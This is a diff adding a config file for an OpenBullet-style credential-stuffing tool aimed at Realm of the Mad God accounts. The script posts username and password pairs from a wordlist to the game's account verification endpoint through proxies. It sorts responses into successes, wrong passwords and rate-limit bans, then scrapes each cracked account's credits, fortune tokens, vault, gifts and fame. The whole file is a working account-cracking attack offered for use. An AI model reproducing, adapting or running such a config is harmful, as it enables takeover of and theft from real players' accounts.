@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "ROTMG",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-07T04:17:43.656044-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.realmofthemadgod.com/account/verify?g=<USER>" 
+  CONTENT "password=<PASS>&ignore=10821&guid=<USER>&gameClientVersion=X31%2E6%2E0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Credits>" 
+  KEYCHAIN Failure OR 
+    KEY "passwordError" 
+  KEYCHAIN Ban OR 
+    KEY "minutes to try again" 
+
+PARSE "<SOURCE>" LR "<Credits>" "</Credits>" -> CAP "Credits" 
+
+PARSE "<SOURCE>" LR "<FortuneToken>" "</FortuneToken>" -> CAP "Fortune" 
+
+PARSE "<SOURCE>" LR "<UnityCampaignPoints" "</UnityCampaignPoints" -> CAP "Unity" 
+
+PARSE "<SOURCE>" LR "<Vault>" "</Vault>" -> CAP "Vault" 
+
+PARSE "<SOURCE>" LR "<Gifts>" "</Gifts>" -> CAP "Gifts" 
+
+PARSE "<SOURCE>" LR "<ArenaTickets>" "</ArenaTickets>" -> CAP "Arena Tickets" 
+
+PARSE "<SOURCE>" LR "<BestCharFame>" "</BestCharFame>" -> CAP "Best Character Fame" 
+
+PARSE "<SOURCE>" LR "<TotalFame>" "</TotalFame>" -> CAP "Total Fame" 
+
